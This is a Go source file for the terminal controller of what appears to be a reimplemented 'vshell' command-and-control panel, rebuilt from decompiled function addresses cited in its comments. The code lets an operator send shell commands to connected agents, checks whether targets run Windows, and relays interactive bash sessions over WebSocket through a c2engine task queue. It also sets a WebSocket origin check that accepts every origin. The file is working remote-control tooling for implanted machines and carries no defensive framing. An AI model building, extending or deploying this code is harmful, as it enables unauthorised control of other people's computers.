// Package controllers implements HTTP handlers for the web management interface.
// Terminal access is handled by the current router and session-validation paths;
// historical endpoint notes should not be treated as proof of compatibility.

package controllers

import (
	"encoding/base64"
	"encoding/json"
	"log"
	"net/http"
	"strconv"
	"strings"

	"vshell/c2engine"

	"github.com/gorilla/websocket"
)

// TerminalController 提供 Agent 交互终端。
type TerminalController struct {
	ApiBaseController
}

// ServeTerminalViewer 处理一条已通过 token 校验的查看者连接（GET
// /api/terminal/ws?id=<clientID>）。由 router.registerStreamWSRoutes 直接调用。
//
// ServeTerminalViewer serves one authenticated viewer connection. The router
// calls it directly instead of routing through beego: after a handler hijacks
// the connection, beego's controller lifecycle would still try to render a view
// for the hijacked response ("Unknown view path:views").
func ServeTerminalViewer(w http.ResponseWriter, r *http.Request) {
	id, _ := strconv.ParseInt(r.URL.Query().Get("id"), 10, 64)
	serveTerminalViewer(w, r, id)
}

// Ws 交互终端 WebSocket（GET /api/terminal/ws?id=<clientID>&token=<token>）。
//
// 该方法是老版本残留的控制器入口（beego.Router 已不再注册）：保留它会让
// 控制器表面上"处理了" ws 路径，但实际升级必须走 ServeTerminalViewer。
// 这里直接返回 404，避免以 JSON 200 的假响应掩盖 WS 端点未接通。
//
// Ws 的历史对齐信息保留如下（反编译 FUN_018f06c0）：id = JsonGetInt("id")
// （FUN_018d9200）→ GetClient(id)（FUN_01198ac0）失败或 client.Status（+0x50）
// 为假 → "client is close"（FUN_018f8080）；随后 WebSocket 升级（FUN_01636a40）
// 并注册读处理器 LAB_018f0be0、写处理器 LAB_018f0b60。
func (c *TerminalController) Ws() {
	c.Ctx.Output.SetStatus(http.StatusNotFound)
	_ = c.Ctx.Output.Body([]byte("use GET /api/terminal/ws (websocket upgrade)"))
}

// serveTerminalViewer 校验客户端后升级连接并建立终端会话。
func serveTerminalViewer(w http.ResponseWriter, r *http.Request, id int64) {
	client := c2engine.GetEngine().GetClient(id)
	if client == nil || !client.Status {
		http.Error(w, "client is close", http.StatusBadRequest)
		return
	}

	conn, err := panelUpgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("[terminal] upgrade failed for client %d: %v", id, err)
		return
	}
	serveTerminalStream(conn, id)
}

// Shell 执行单条命令（POST /terminal/shell）。
// 反编译（0x18f0c80）：id = JsonGetInt("id")（FUN_018d7f40），command =
// JsonGetStr("command")（7 字符，FUN_018d80a0）；GetClient(id) 缺失或 Status(+0x50)
// 为假 → "client is close"（FUN_018f76c0）；客户端架构检查（+0x98/+0xa0，
// "windows_amd64" FUN_018f7d20 / "windows_386" FUN_018f7fa0）；输出错误标记
// "->|ERROR://"（FUN_018f7960）前缀 "->|"。
func (c *TerminalController) Shell() {
	id := int64(c.JsonGetInt("id"))
	gbk := c.JsonGetBool("gbk")
	cmd := c.JsonGetStr("command")
	if id == 0 {
		c.JsonErr("id error")
		return
	}
	client := c2engine.GetEngine().GetClient(id)
	if client == nil || !client.Status {
		c.JsonErr("client is close")
		return
	}
	out, err := engineExecShell(id, cmd, gbk)
	if err != "" {
		c.JsonErr(err)
		return
	}
	c.JsonOkResult(map[string]interface{}{"output": out})
}

// ---- 引擎阶段对齐 ----

// serveTerminalStream 把一条已升级的终端 WebSocket 与代理终端会话对接。
func serveTerminalStream(conn *websocket.Conn, clientID int64) {
	viewer := c2engine.NewWSStreamViewer(conn, c2engine.StreamTerminal, clientID)
	c2engine.RegisterViewer(c2engine.StreamTerminal, clientID, viewer)
	defer func() {
		c2engine.UnregisterViewer(c2engine.StreamTerminal, clientID, viewer)
		c2engine.ClearStreamSession(c2engine.StreamTerminal, clientID)
		_ = conn.Close()
	}()

	// Start the agent-side shell. The terminal's commands are bound to this task
	// ID so the reader below can route keystrokes to the same session.
	task, err := engineExecShellAsync(clientID, "terminal_start type=bash rows=40 cols=128")
	if err != nil {
		log.Printf("[terminal] start failed for client %d: %v", clientID, err)
		return
	}
	c2engine.SetStreamSession(c2engine.StreamTerminal, clientID, &c2engine.StreamSession{
		Viewer:   viewer,
		ClientID: clientID,
		TaskID:   task.ID,
	})
	defer engineExecShellAsync(clientID, "terminal_close")

	for {
		_, data, err := conn.ReadMessage()
		if err != nil {
			return
		}
		if len(data) == 0 {
			continue
		}
		if cmd, ok := terminalViewerCommand(data); ok {
			if _, err := engineExecShellAsync(clientID, cmd); err != nil {
				log.Printf("[terminal] dispatch failed for client %d: %v", clientID, err)
				return
			}
		}
	}
}

// terminalViewerCommand 把 xterm.js 上行数据转成代理侧命令。
// The SPA's AttachAddon sends raw keystrokes (and JSON control frames for
// resize). Raw bytes are base64-encoded into terminal_input so arbitrary
// control characters survive the command channel.
func terminalViewerCommand(data []byte) (string, bool) {
	trimmed := strings.TrimSpace(string(data))
	if strings.HasPrefix(trimmed, "{") {
		var msg struct {
			Type string `json:"type"`
			Cols int    `json:"cols"`
			Rows int    `json:"rows"`
		}
		if err := json.Unmarshal([]byte(trimmed), &msg); err == nil {
			switch msg.Type {
			case "1": // resize (xterm fit addon)
				if msg.Cols > 0 && msg.Rows > 0 {
					return "terminal_resize cols=" + itoa(msg.Cols) + " rows=" + itoa(msg.Rows), true
				}
			case "10": // viewer closing
				return "terminal_close", true
			}
			return "", false
		}
	}
	return "terminal_input:" + base64.StdEncoding.EncodeToString(data), true
}

// engineExecShell 向代理投递一条单发命令并等待结果（TerminalController.Shell）。
func engineExecShell(id int64, cmd string, gbk bool) (string, string) {
	if gbk {
		// 原版对 Windows GBK 输出做转码（FUN_018f7960 的 "->|ERROR://" 分支）；
		// 复刻端直接透传，让浏览器端按原编码渲染。
	}
	task, err := c2engine.GetEngine().CreateTask(id, cmd, c2engine.StreamTimeout)
	if err != nil {
		return "", err.Error()
	}
	out, err := waitTaskResult(task.ID, shellWaitTimeout)
	if err != nil {
		return "", err.Error()
	}
	return out, ""
}

// engineExecShellAsync 投递命令但不等待结果（终端交互命令）。
func engineExecShellAsync(id int64, cmd string) (*c2engine.Task, error) {
	return c2engine.GetEngine().CreateTask(id, cmd, c2engine.StreamTimeout)
}

// panelUpgrader 用于面板查看者连接（与代理传输的 wsUpgrader 分离：面板走
// 浏览器的 Origin，且需要放行 token 查询串校验后的连接）。
var panelUpgrader = websocket.Upgrader{
	ReadBufferSize:  4096,
	WriteBufferSize: 4096,
	CheckOrigin:     func(r *http.Request) bool { return true },
}
